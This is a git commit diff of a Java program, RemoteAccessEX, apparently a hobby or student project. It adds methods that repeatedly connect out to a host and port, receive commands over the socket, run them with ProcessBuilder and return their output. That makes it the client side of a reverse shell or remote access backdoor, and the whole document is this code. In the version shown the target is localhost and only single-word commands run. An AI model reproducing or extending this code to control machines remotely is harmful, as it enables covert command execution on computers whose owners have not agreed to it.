8eb97b89d26a610cf0fb8cddbddc2406ea344482
shoshanimayan <mshoshan@uci.edu>
2017-08-28 20:07:27 -0700

    added in resolve,connect, and execute methods, compiles correctly now just needs to recieve messages

--- RemoteAccessEX.java
+++ RemoteAccessEX.java
@@ -1,10 +1,7 @@
-import java.io.BufferedReader;
-import java.io.IOException;
-import java.io.InputStreamReader;
-import java.io.PrintWriter;
-import java.net.InetAddress;
-import java.net.Socket;
-import java.util.Scanner;
+
+import java.util.*;
+import java.net.*;
+import java.io.*;
 //methods to add, connect, execute, resolve
 public class RemoteAccessEX{
   private static Socket s; //socket recieves input
@@ -16,41 +13,104 @@ public class RemoteAccessEX{
   private static String line;
   private static String stdout;
 
-  public static void main(String args[]){
+  private static int connect(String ip, int port){///method attempts to create the connection
+    try{
+      s= new Socket(ip,port);
+      //System.out.println("connected");
+      return 1;
+    }
+    catch(Exception err){
+      System.out.println(err.getMessage());
+      return 0;
+    }
+  }
+
+  private static String resolve(String host){
+    //This method grabs the IP address of the host and return it as a string
+    InetAddress ip;
+    while(true){
+      try{
+        ip=InetAddress.getByName(host);
+    //    System.out.println(ip);
+        host=ip.getHostAddress().toString();
+        return host;
+      }
+      catch(Exception err){
+        continue;
+      }
+    }
+  }
+
+  private static String execute(String recieved) throws IOException, InterruptedException{
+    String splitted[]= recieved.split(" ");
+    length=splitted.length;
+    if(length==1){
+      try{
+        ps = new ProcessBuilder(splitted[0]);
+        ps.redirectErrorStream(true);
+        Process pr = ps.start();
+        in = new BufferedReader(new InputStreamReader(pr.getInputStream()));
+        line ="";
+        stdout="";
+        while((line = in.readLine())!=null){
+          stdout=stdout+line;
+        }
+        stdout=stdout.toString();
+        pr.waitFor();
+        in.close();
+        return stdout;
+      }
+      catch(Exception er){ return er.toString();}
+    }
+    else{return "to many args";}
+  }
+
+
+  public static void main(String args[]) throws IOException{
     String host="localhost";
-    int port = 123;
+    int port = 3306;
     String ip=resolve(host);
-    int stat;
+    //System.out.println(ip);
+    int stat=0;
     while(stat!=1){stat=connect(ip,port); //keep trying to connect
-    System.out.println("cconnecting");}
-    System.out.println("connected");//connected
+    System.out.println("connecting");}
+    //System.out.println("connected");//connected
     pr=new PrintWriter(s.getOutputStream(),true); // look at output stream
-    sc = new Scanners(s.getInputStream());// look at output stream
+    sc = new Scanner(s.getInputStream());// look at output stream
     sc.useDelimiter("\0");//Delimiter is used in order to know the end of the message received.
     String recieved;
     String stdout;
     while(true){
-      try{
+      try{//try to recieve message
         recieved = sc.next();
-        recieved = recieved.trim();
-        recieved = recieved.replace("\0","");
-        if(received.contains("quit")){
+        recieved =  recieved.trim();
+        recieved =  recieved.replace("\0","");
+        System.out.println("got stuff");
+
+        if( recieved.contains("quit")){///exit if message is quit
           pr.println("quit");
           sc.close();
           s.close();
           System.exit(0);
         }
-        else{
+        else{//try to execute method sent
           stdout = execute(recieved);
           pr.print(stdout+"\0");
           pr.flush();
         }
       }
-      catch(Exception e){
-        while(stat!=1){stat=connect(ip,port);}
+      catch(Exception err){//try again
+        System.out.println(err.getMessage());
+        //System.gc();
+        stat=0;
+        //System.out.println(ip);
+        //System.out.println(port);
+        do{
+          stat=connect(ip,port);
+        }while(stat!=1);
         System.out.println("connected");
         pr=new PrintWriter(s.getOutputStream(),true);
-        sc = new Scanners(s.getInputStream());
+        sc= new Scanner(s.getInputStream());
         sc.useDelimiter("\0");
       }
     }
